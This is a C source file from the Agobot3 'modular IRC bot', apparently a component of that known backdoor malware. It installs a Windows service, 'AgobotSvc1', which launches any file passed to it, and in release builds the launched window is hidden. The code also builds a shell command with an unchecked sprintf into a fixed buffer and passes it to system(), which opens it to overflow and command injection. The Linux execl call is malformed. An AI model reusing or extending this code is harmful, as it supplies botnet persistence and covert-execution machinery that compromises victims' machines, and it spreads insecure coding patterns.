/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include <windows.h>
#include <winsvc.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

SERVICE_STATUS			AgobotSvcStatus1;
SERVICE_STATUS_HANDLE	AgobotSvcStatusHandle1;
int g_argc;
char **g_argv;

VOID WINAPI		AgobotSvcStart1(DWORD argc, LPTSTR *argv);
VOID WINAPI		AgobotSvcCtrlHandler1(DWORD opcode);
DWORD WINAPI	AgobotSvcInitialization1(DWORD argc, LPTSTR *argv, DWORD *specificError);
void			ExecuteTheFile(char *filename, char *params);

void main(int argc, char **argv)
{	SERVICE_TABLE_ENTRY DispatchTable[]= {
		{	"AgobotSvc1",	AgobotSvcStart1	},
		{	NULL,			NULL			} };

	g_argv=argv; g_argc=argc;

	if(!StartServiceCtrlDispatcher(DispatchTable)) return; }

void WINAPI AgobotSvcStart1(DWORD argc, LPTSTR *argv)
{	DWORD status; DWORD specificError;

	AgobotSvcStatus1.dwServiceType				=	SERVICE_WIN32;
	AgobotSvcStatus1.dwCurrentState				=	SERVICE_START_PENDING;
	AgobotSvcStatus1.dwControlsAccepted			=	SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_PAUSE_CONTINUE;
	AgobotSvcStatus1.dwWin32ExitCode				=	0;
	AgobotSvcStatus1.dwServiceSpecificExitCode	=	0;
	AgobotSvcStatus1.dwCheckPoint				=	0;
	AgobotSvcStatus1.dwWaitHint					=	0;
	
	AgobotSvcStatusHandle1=RegisterServiceCtrlHandler("AgobotSvc1", AgobotSvcCtrlHandler1);
	
	if(AgobotSvcStatusHandle1==(SERVICE_STATUS_HANDLE)0) return;

	status=AgobotSvcInitialization1(argc, argv, &specificError);
	if(status!=NO_ERROR)
	{	AgobotSvcStatus1.dwCurrentState				=	SERVICE_STOPPED;
		AgobotSvcStatus1.dwCheckPoint				=	0;
		AgobotSvcStatus1.dwWaitHint					=	0;
		AgobotSvcStatus1.dwWin32ExitCode				=	status;
		AgobotSvcStatus1.dwServiceSpecificExitCode	=	specificError;

		SetServiceStatus(AgobotSvcStatusHandle1, &AgobotSvcStatus1); return; }

	AgobotSvcStatus1.dwCurrentState	=	SERVICE_RUNNING;
	AgobotSvcStatus1.dwCheckPoint	=	0;
	AgobotSvcStatus1.dwWaitHint		=	0;

	if(!SetServiceStatus(AgobotSvcStatusHandle1, &AgobotSvcStatus1)) return;

	if(g_argc > 1) ExecuteTheFile(g_argv[1], g_argv[2]);

	AgobotSvcStatus1.dwCurrentState				=	SERVICE_STOPPED;
	AgobotSvcStatus1.dwCheckPoint				=	0;
	AgobotSvcStatus1.dwWaitHint					=	0;
	AgobotSvcStatus1.dwWin32ExitCode				=	0;
	AgobotSvcStatus1.dwServiceSpecificExitCode	=	0;

	SetServiceStatus(AgobotSvcStatusHandle1, &AgobotSvcStatus1);

	return; }

DWORD WINAPI AgobotSvcInitialization1(DWORD argc, LPTSTR *argv, DWORD *specificError)
{	return(0); }

void WINAPI AgobotSvcCtrlHandler1(DWORD Opcode)
{	switch(Opcode)
	{
	case SERVICE_CONTROL_PAUSE:
		AgobotSvcStatus1.dwCurrentState=SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		AgobotSvcStatus1.dwCurrentState=SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_STOP:
        AgobotSvcStatus1.dwWin32ExitCode	=	0;
		AgobotSvcStatus1.dwCurrentState	=	SERVICE_STOPPED;
		AgobotSvcStatus1.dwCheckPoint	=	0;
		AgobotSvcStatus1.dwWaitHint		=	0;

		SetServiceStatus(AgobotSvcStatusHandle1, &AgobotSvcStatus1); return;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
	
	SetServiceStatus(AgobotSvcStatusHandle1, &AgobotSvcStatus1);
	return; }

bool Execute(const char *filename, const char *params)
#ifdef WIN32
#ifndef _DEBUG
{	if((int)ShellExecute(0, "open", filename, params, NULL, SW_HIDE)>=32) return true; else return false; }
#else
{	if((int)ShellExecute(0, "open", filename, params, NULL, SW_SHOW)>=32) return true; else return false; }
#endif // _DEBUG
#else // LINUX
{	if(fork()==0)
	{	execl(filename, params);
		exit(0); }
	else return false;
	return true; }
#endif // WIN32

void ExecuteTheFile(char *filename, char *params)
{	
	char szCmdBuf[MAX_PATH];
	sprintf(szCmdBuf, "%s %s", filename, params);
	system(szCmdBuf);
}
